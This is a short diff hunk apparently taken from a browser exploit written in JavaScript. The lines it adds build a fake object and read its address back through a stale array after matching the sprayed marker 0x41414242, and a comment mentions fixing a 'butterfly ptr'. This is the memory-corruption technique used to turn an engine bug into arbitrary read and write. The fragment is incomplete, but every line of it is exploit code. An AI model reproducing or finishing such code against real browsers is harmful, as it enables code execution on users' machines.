@@ -171,7 +171,9 @@ function go_() {
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
 				// Create fakeobj for fixing butterfly ptr
-
+				var fakeobj = {};
+				stale[0] = fakeobj;
+				var fop = bufs[i][k];
  			
 
 				stale[0] = {
